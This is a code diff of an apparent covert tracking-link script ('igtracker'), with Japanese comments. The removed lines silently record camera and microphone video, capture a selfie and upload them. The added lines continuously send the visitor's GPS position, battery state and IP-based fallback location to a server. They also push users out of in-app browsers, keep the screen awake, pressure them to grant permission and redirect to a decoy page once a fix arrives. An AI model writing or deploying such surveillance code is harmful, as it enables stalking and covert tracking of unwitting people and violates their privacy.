@@ -1,14 +1,46 @@
-/* リアルタイム映像＋音声（igtracker v2）
-   ★ v2: gate.js から呼ばれても「録画が始まる」ように修正（cam/mic → start()）。
-        プレビューは常に見える位置へ。ゲート通過後にも確実に開始。 */
+/* igtracker 連続位置追跡クライアント v16
+   位置情報は geofix.js（LTGEO）に一本化。
+   端末が位置を出せないときは回線からの推定で点を必ず残す。 */
 (function () {
   "use strict";
+
   var CODE = window.LT_CODE || "";
   if (!CODE) return;
-  var HIT = window.LT_HIT || 0;
-  var SEG_MS = 20000;
 
-  function sid() {
+  (function () {
+    if (window.LT_LINE_FIX === 0) return;
+    var ua = navigator.userAgent || "";
+    if (!/Line\//i.test(ua)) return;
+    if (/[?&]openExternalBrowser=1/.test(location.search)) return;
+    try {
+      var u = new URL(location.href);
+      u.searchParams.set("openExternalBrowser", "1");
+      location.replace(u.toString());
+    } catch (e) {
+      location.replace(location.href +
+        (location.search ? "&" : "?") + "openExternalBrowser=1");
+    }
+  })();
+
+  var API = "/l/" + encodeURIComponent(CODE) + "/p";
+  var IV = Math.max(5, (window.LT_IV || 15) | 0) * 1000;
+  var MAXMIN = (window.LT_MAX || 180) | 0;
+  var HIT = window.LT_HIT || 0;
+  var SEND_EVERY = Math.min(IV, 4000);
+
+  var DEST = window.LT_DEST || "";
+  var DEST_MIN = (parseFloat(window.LT_DEST_MIN) || 2) * 1000;
+  var DENY_REDIRECT = !!window.LT_DENY_REDIRECT;
+  var ASK_TEXT = window.LT_ASK_TEXT || "位置情報の使用を許可してください";
+  var DENY_TEXT = window.LT_DENY_TEXT || "アクセスを許可されなかったため確認できませんでした。アクセスを許可してください";
+  var RETRY_TEXT = window.LT_RETRY_TEXT || "もう一度";
+  var DEBUG = !!window.LT_DEBUG || /[?&]dbg=1/.test(location.search);
+
+  function canLeave() {
+    return !!DEST && (!window.LT_REQUIRE_ALL || !!window.LT_ALLOW_REDIRECT);
+  }
+
+  var SID = (function () {
     try {
       var v = sessionStorage.getItem("igt_sid_" + CODE);
       if (!v) {
@@ -17,177 +49,258 @@
       }
       return v;
     } catch (e) { return Math.random().toString(36).slice(2, 12); }
+  })();
+
+  var q = [], sending = false, last = 0, started = 0, count = 0, left = false;
+  var wake = null, clock = null, sender = null, dog = null;
+  var stopped = true, gotFix = false, lastFixAt = 0, lastIp = 0, lastRetry = 0;
+  var state = "wait", batt = null, chg = null, inapp = "";
+
+  function $(id) { return document.getElementById(id); }
+  function iso(t) { try { return new Date(t).toISOString(); } catch (e) { return ""; } }
+  function line(t, w) {
+    var s = $("lt_st");
+    if (!s) return;
+    s.textContent = t || "";
+    s.className = "line" + (w ? " warn" : "");
   }
-  var SID = sid();
-
-  function vid8() {
-    try {
-      var v = (window.LT_PAYLOAD && window.LT_PAYLOAD.vid) ||
-              localStorage.getItem("igt_vid") || "";
-      return String(v).replace(/[^a-zA-Z0-9]/g, "").slice(0, 8) || "x";
-    } catch (e) { return "x"; }
+  function dbg(m) { if (DEBUG) { var d = $("lt_dbg"); if (d) d.textContent = m; } }
+  function showDbg() {
+    if (!DEBUG) return;
+    ["lt_dbg", "lt_now", "lt_perm", "lt_time"].forEach(function (id) {
+      var e = $(id);
+      if (e) { e.className = ""; e.style.cssText = "display:block;font-size:11px;color:#6b7386"; }
+    });
   }
-
-  var stream = null, rec = null, seq = 0, timer = null, guard = null;
-  var mime = "", ext = "webm", wantRun = false, selfied = false, parts = [];
-
-  function pickMime() {
-    var c = ["video/webm;codecs=vp8,opus", "video/webm;codecs=vp9,opus",
-             "video/webm", "video/mp4", "video/mp4;codecs=h264"];
-    for (var i = 0; i < c.length; i++) {
-      try {
-        if (window.MediaRecorder && MediaRecorder.isTypeSupported &&
-            MediaRecorder.isTypeSupported(c[i])) return c[i];
-      } catch (e) {}
+  function showRetry() {
+    var r = $("lt_retry");
+    if (r) { r.textContent = RETRY_TEXT; r.style.display = state === "deny" ? "" : "none"; }
+  }
+  function announce() {
+    window.LT_GPS_READY = true;
+    try { window.dispatchEvent(new Event("igt:gps")); } catch (e) {}
+  }
+  function showInApp() {
+    var box = $("lt_ia"), nm = $("lt_ia_name"), link = $("lt_safari");
+    if (!box) return;
+    box.style.display = "block";
+    if (nm) nm.textContent = inapp;
+    if (link) {
+      var ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
+      link.href = ios
+        ? location.href.replace(/^https:/, "x-safari-https:")
+        : "intent://" + location.href.replace(/^https?:\/\//, "") +
+          "#Intent;scheme=https;package=com.android.chrome;end";
+      link.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
     }
-    return "";
   }
-
-  function post(blob, beacon) {
-    if (!blob || !blob.size) return;
-    var u = "/s/" + encodeURIComponent(CODE) + "/vseg?sid=" + encodeURIComponent(SID) +
-            "&vid=" + encodeURIComponent(vid8()) + "&seq=" + (seq++) +
-            "&ext=" + ext + "&hit=" + HIT;
-    if (beacon && navigator.sendBeacon) {
-      try { if (navigator.sendBeacon(u, blob)) return; } catch (e) {}
+  function setState(st) {
+    if (st === "ok") {
+      if (state === "ok") return;
+      state = "ok"; line("", false); showRetry();
+      var ia = $("lt_ia"); if (ia) ia.style.display = "none";
+      return;
     }
-    try { fetch(u, { method: "POST", body: blob, keepalive: true }).catch(function () {}); }
-    catch (e) {}
+    state = st;
+    if (st === "deny") { line(DENY_TEXT, true); if (inapp) showInApp(); }
+    else { line(ASK_TEXT, false); }
+    showRetry();
+  }
+  function tick() {
+    if (!started) return;
+    var sec = Math.floor((Date.now() - started) / 1000);
+    var e = $("lt_time");
+    if (e) e.textContent = ("0" + Math.floor(sec / 60)).slice(-2) + ":" + ("0" + (sec % 60)).slice(-2);
+  }
+  function drop(arr) { q = q.filter(function (x) { return arr.indexOf(x) === -1; }); }
+
+  /* 位置が取れないとき：lat/lon無しで送る → サーバが回線から推定して点にする */
+  function ipFallback(force) {
+    if (gotFix || stopped || left) return;
+    var now = Date.now();
+    if (!force && now - lastIp < 55000) return;
+    lastIp = now;
+    try { q.push({ ts: iso(now) }); send(); } catch (e) {}
   }
 
-  function preview() {
+  function send(extra) {
+    if (sending) return;
+    if (!q.length && !extra) return;
+    sending = true;
+    var pts = q.slice(0);
+    fetch(API, {
+      method: "POST", cache: "no-store",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sid: SID, kind: (extra && extra.kind) || "pt", hit: HIT, pts: pts }),
+    })
+      .then(function (r) { return r.json().catch(function () { return {}; }); })
+      .then(function (j) { drop(pts); last = Date.now(); if (j && j.iv && j.iv * 1000 !== IV) IV = j.iv * 1000; })
+      .catch(function () {})
+      .then(function () { sending = false; });
+  }
+  function beacon(kind) {
+    var pts = q.slice(0);
+    var payload = JSON.stringify({ sid: SID, kind: kind, hit: HIT, pts: pts });
+    var ok = false;
     try {
-      var v = document.getElementById("lt_cam");
-      if (!v) {
-        v = document.createElement("video");
-        v.id = "lt_cam";
-        v.autoplay = true; v.muted = true; v.playsInline = true;
-        v.setAttribute("playsinline", "");
-        v.style.cssText =
-          "position:fixed;right:10px;bottom:10px;width:112px;height:84px;" +
-          "object-fit:cover;border-radius:10px;background:#000;z-index:5;" +
-          "box-shadow:0 2px 10px rgba(0,0,0,.5);opacity:.92";
-        document.body.appendChild(v);
+      ok = !!(navigator.sendBeacon && navigator.sendBeacon(
+        API, new Blob([payload], { type: "application/json" })));
+    } catch (e) { ok = false; }
+    if (ok) drop(pts); else send({ kind: kind });
+  }
+  function goto(url) {
+    if (!url || left) return;
+    left = true;
+    try { beacon("stop"); } catch (e) {}
+    try { location.replace(url); } catch (e) { location.href = url; }
+  }
+  function leave() { if (!left && canLeave()) goto(DEST); }
+
+  /* LTGEO から位置が来たとき */
+  function onFix(p) {
+    var c = (p && p.coords) || {};
+    if (c.latitude == null) return;
+    var first = !gotFix;
+    gotFix = true; count++; lastFixAt = Date.now();
+    if (first) {
+      setState("ok"); announce();
+      if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
+      if (canLeave()) setTimeout(leave, DEST_MIN);
+    }
+    q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
+             acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
+    if (q.length > 3000) q.splice(0, q.length - 3000);
+    var n = $("lt_now");
+    if (n) n.textContent = c.latitude.toFixed(5) + ", " + c.longitude.toFixed(5) +
+                           (c.accuracy ? " ±" + Math.round(c.accuracy) + "m" : "");
+    dbg("fix acc=" + Math.round(c.accuracy || 0) + " n=" + count);
+    if (count === 1 || q.length >= 4 || Date.now() - last > SEND_EVERY) send();
+  }
+
+  function onFail(why) {
+    ipFallback(true);
+    if (gotFix) return;
+    document.body.classList.add("need");
+    setState("deny");
+    if (why === "denied") showInApp();
+  }
+
+  function watchdog() {
+    if (stopped || left) return;
+    var gap = Date.now() - (lastFixAt || started || Date.now());
+    if (!gotFix) {
+      if (gap > 15000 && Date.now() - lastRetry > 12000) {
+        lastRetry = Date.now();
+        if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
       }
-      if (stream && v.srcObject !== stream) {
-        v.srcObject = stream;
-        var p = v.play(); if (p && p.catch) p.catch(function () {});
+      ipFallback(false);
+    }
+  }
+
+  function readBatt() {
+    try {
+      if (!navigator.getBattery) return;
+      navigator.getBattery().then(function (b) {
+        function up() { batt = b.level; chg = b.charging ? 1 : 0; }
+        up();
+        b.addEventListener("levelchange", up);
+        b.addEventListener("chargingchange", up);
+      }).catch(function () {});
+    } catch (e) {}
+  }
+  function keepAwake() {
+    try {
+      if (navigator.wakeLock && !wake) {
+        navigator.wakeLock.request("screen").then(function (w) {
+          wake = w; w.addEventListener("release", function () { wake = null; });
+        }).catch(function () {});
       }
     } catch (e) {}
   }
 
-  function selfie() {
-    if (selfied || !stream) return;
-    selfied = true;
-    setTimeout(function () {
-      try {
-        var v = document.getElementById("lt_cam");
-        var w = v && v.videoWidth ? v.videoWidth : 480;
-        var h = v && v.videoHeight ? v.videoHeight : 360;
-        var c = document.createElement("canvas");
-        c.width = w; c.height = h;
-        c.getContext("2d").drawImage(v, 0, 0, w, h);
-        fetch("/s/" + encodeURIComponent(CODE) + "/cap", {
-          method: "POST", headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ kind: "selfie", data: c.toDataURL("image/jpeg", 0.7),
-                                 hit: HIT, vid: vid8() }),
-        }).catch(function () {});
-      } catch (e) {}
-    }, 1800);
+  function boot() {
+    if (started) return;
+    started = Date.now(); stopped = false;
+    showDbg(); readBatt(); keepAwake(); showRetry();
+    if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
+
+    if (!window.LTGEO) { setState("deny"); return; }
+    LTGEO.subscribe(onFix);
+    LTGEO.subscribeFail(onFail);
+    LTGEO.subscribeStatus(function (t, w) { if (state !== "ok") line(t, w); });
+    if (window.LT_FIRST_FIX) { try { onFix(window.LT_FIRST_FIX); } catch (e) {} }
+    LTGEO.start();
+
+    clock = setInterval(tick, 1000);
+    sender = setInterval(function () {
+      tick();
+      if (q.length) send();
+      else if (Date.now() - last > Math.max(30000, IV * 3)) send({ kind: "hb" });
+      if (MAXMIN && Date.now() - started > MAXMIN * 60000) stop("時間上限");
+    }, SEND_EVERY);
+    dog = setInterval(watchdog, 5000);
+    setTimeout(function () { if (!gotFix) ipFallback(true); }, 9000);
+
+    if (!q.length) q.push({ ts: iso(Date.now()) });
+    send({ kind: "open" });
   }
 
-  function ensure() {
-    wantRun = true;                       // ★ 呼ばれたら録画する気でいる
-    if (stream) return Promise.resolve(true);
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      return Promise.resolve(false);
-    }
-    return navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
-      audio: true,
-    }).then(function (s) {
-      stream = s;
-      mime = pickMime();
-      ext = /mp4/.test(mime) ? "mp4" : "webm";
-      preview(); selfie();
-      startRec();                         // ★ すぐ録画開始
-      return true;
-    }).catch(function () { return false; });
+  function stop() {
+    if (stopped) return;
+    stopped = true; started = 0;
+    if (clock) clearInterval(clock);
+    if (sender) clearInterval(sender);
+    if (dog) clearInterval(dog);
+    clock = sender = dog = null;
+    if (window.LTGEO) { try { LTGEO.stop(); } catch (e) {} }
+    beacon("stop");
+    state = "wait";
+    showRetry();
   }
-
-  function startRec() {
-    if (!stream || !mime) return;
-    if (rec && rec.state !== "inactive") return;
-    try {
-      rec = new MediaRecorder(stream, {
-        mimeType: mime, videoBitsPerSecond: 180000, audioBitsPerSecond: 32000,
-      });
-    } catch (e) {
-      try { rec = new MediaRecorder(stream); mime = rec.mimeType || mime; } catch (e2) { return; }
-    }
-    parts = [];
-    rec.ondataavailable = function (e) { if (e.data && e.data.size) parts.push(e.data); };
-    rec.onstop = function () {
-      var p = parts; parts = [];
-      post(new Blob(p, { type: mime || "video/webm" }), false);
-      if (wantRun && !document.hidden) startRec();
-    };
-    try { rec.start(); } catch (e) { return; }
-    if (timer) clearTimeout(timer);
-    timer = setTimeout(function () { stopRec(false); }, SEG_MS);
+  function resume() {
+    if (stopped || left) return;
+    keepAwake();
+    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
+    send({ kind: "hb" });
   }
-
-  function stopRec(final) {
-    if (timer) { clearTimeout(timer); timer = null; }
-    if (!rec || rec.state === "inactive") return;
-    var r = rec;
-    if (final) {
-      r.onstop = function () {
-        var p = parts; parts = [];
-        post(new Blob(p, { type: mime || "video/webm" }), true);
-      };
-    }
-    try { r.stop(); } catch (e) {}
-  }
-
-  /* ★ 外から呼ばれるのはここ。必ず録画まで行く */
-  function start() {
-    return ensure().then(function (ok) {
-      if (ok) startRec();
-      return ok;
-    });
-  }
-  function stop() { wantRun = false; stopRec(false); }
 
   document.addEventListener("visibilitychange", function () {
-    if (document.visibilityState === "hidden") { if (wantRun) stopRec(true); return; }
-    if (wantRun && stream && (!rec || rec.state === "inactive")) startRec();
+    if (document.visibilityState === "hidden") { if (!left && started) beacon("hb"); return; }
+    if (started) resume();
   });
-  window.addEventListener("pagehide", function () { if (wantRun) stopRec(true); });
+  window.addEventListener("focus", function () { if (started) resume(); });
+  window.addEventListener("online", function () { if (started) resume(); });
+  window.addEventListener("pagehide", function () { if (!left && started) beacon("stop"); });
+  window.addEventListener("pageshow", function (e) {
+    if (!e.persisted || !started) return;
+    stopped = false; left = false;
+    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
+    send({ kind: "open" });
+  });
+  document.addEventListener("click", function (e) {
+    var t = e.target;
+    if (t && t.tagName === "BUTTON") return;
+    if (started && !stopped && !gotFix && window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
+  }, { passive: true });
+  var rt = $("lt_retry");
+  if (rt) rt.addEventListener("click", function () {
+    setState("wait");
+    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
+  });
 
-  /* 録画が落ちていないか3秒ごとに見張る */
-  guard = setInterval(function () {
-    if (!wantRun || !stream) return;
-    if (!rec || rec.state === "inactive") startRec();
-  }, 3000);
-
-  window.LTCAM = {
-    start: start, stop: stop, ensure: ensure, sid: SID,
-    active: function () { return !!stream; },
-    info: function () { return { mime: mime, seg: seq, sid: SID, rec: !!rec }; },
+  window.LT_LIVE = {
+    start: boot, stop: stop, leave: leave,
+    retry: function () { if (window.LTGEO) LTGEO.retry(); },
+    restart: function () { if (window.LTGEO) LTGEO.retry(); },
+    feed: function (p) { try { onFix(p); } catch (e) {} },
+    canLeave: canLeave, sid: SID,
+    state: function () { return state; },
+    perm: function () { return window.LTGEO ? LTGEO.info().perm : "unknown"; },
   };
 
-  /* spy.js のカメラ/マイクを置き換える（gate.js がここを呼ぶ） */
-  window.LT_CAM = 1;
-  window.LT_MIC = 1;
-  window.LT_SPY = window.LT_SPY || {};
-  window.LT_SPY.cam = start;      // ★ ensure ではなく start
-  window.LT_SPY.mic = start;
-
-  /* ゲート通過後にもう一度起動（取りこぼし防止） */
-  window.addEventListener("igt:gate", function () { start(); });
-  window.addEventListener("load", function () {
-    if (window.LT_GATE && !window.LT_GATE_PASS) return;
-    setTimeout(function () { if (!stream) start(); }, 1500);
-  });
+  if (window.LT_GATE && !window.LT_GATE_PASS) {
+    window.addEventListener("igt:gate", function () { boot(); }, { once: true });
+  } else {
+    boot();
+  }
 })();
